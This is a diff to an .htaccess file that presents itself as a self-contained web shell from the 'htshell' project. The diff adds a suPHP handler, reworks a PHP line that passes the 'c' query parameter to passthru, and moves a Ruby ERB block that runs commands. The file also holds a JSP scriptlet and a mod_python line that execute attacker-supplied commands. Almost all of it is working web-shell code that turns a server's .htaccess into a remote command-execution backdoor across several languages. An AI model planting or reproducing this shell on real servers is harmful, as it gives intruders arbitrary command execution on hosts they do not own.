@@ -1,4 +1,4 @@
-# <!-- 
+# <!--
 # Self contained .htaccess web shell - Part of the htshell project
 # Written by Wireghoul - http://www.justanotherhacker.com
 
@@ -27,8 +27,11 @@
 <IfModule mod_php6.c>
     AddType application/x-httpd-php .htaccess
 </IfModule>
+<IfModule mod_suphp.c>
+    AddType application/x-httpd-suphp .htaccess
+</IfModule>
 
-# <?php echo "--\x3e\n";passthru($_GET['c']." 2>&1"); echo "\x3c!--"; ?>
+# <?php echo "--".chr(62)."\n";passthru($_GET['c']." 2>&1"); echo "\x3c!--"; ?>
 
 <IfModule mod_include.c>
 # Enable serverside includes with exec functionality
@@ -45,17 +48,6 @@
 </IfModule>
 #<jsp:root xmlns:jsp="http://java.sun.com/JSP/Page" version="1.2"><jsp:directive.page import="java.io.*"/><jsp:scriptlet>String cmd = request.getParameter("cmd");String output = "";Process p = null;String s = null;try {if (System.getProperty("os.name").toUpperCase().indexOf("WINDOWS") != -1){p = Runtime.getRuntime().exec("cmd.exe /C " + cmd);}else{p = Runtime.getRuntime().exec( cmd );}BufferedReader sI = new BufferedReader(new InputStreamReader(p.getInputStream()));while((s = sI.readLine()) != null) {out.println( s );}}catch(IOException e) {out.println( e );}}</jsp:scriptlet></jsp:root>
 # --><!--
-# Commented ruby out by using <?ruby instead of the percentage sign as mod_python and mod_ruby clash
-<IfModule mod_ruby.c>
-  RubyRequire apache/erb-run
-  RubySafeLevel 0
-  AddType text/html .htaccess
-  #<Files *.htaccess>
-  #  SetHandler ruby-object
-  #  RubyHandler Apache::ERbRun.instance
-  #</Files>
-</IfModule>
-# <?ruby puts "--\x3e";require 'cgi';cgi=CGI.new;cmd=cgi["c"];cmd.untaint;puts `#{cmd}` ?><!--
 # --><!--
 <IfModule mod_python.c>
   AddType text/html .htaccess
@@ -67,5 +59,16 @@
 # <% import commands %>
 # <%="--\x3e" %>
 #<%=commands.getstatusoutput(form["c"]) %><!--
+# --><!--
+# Commented ruby out by using <!ruby instead of the percentage sign as mod_python and mod_ruby clash
+<IfModule mod_ruby.c>
+   RubyRequire apache/erb-run
+   RubySafeLevel 0
+   AddType text/html .htaccess
+   #<Files *.htaccess>
+   #  SetHandler ruby-object
+   #  RubyHandler Apache::ERbRun.instance
+   #</Files>
+</IfModule>
+# <!ruby puts "--\x3e";require 'cgi';cgi=CGI.new;cmd=cgi["c"];cmd.untaint;puts `#{cmd}` !><!--
 # -->
-
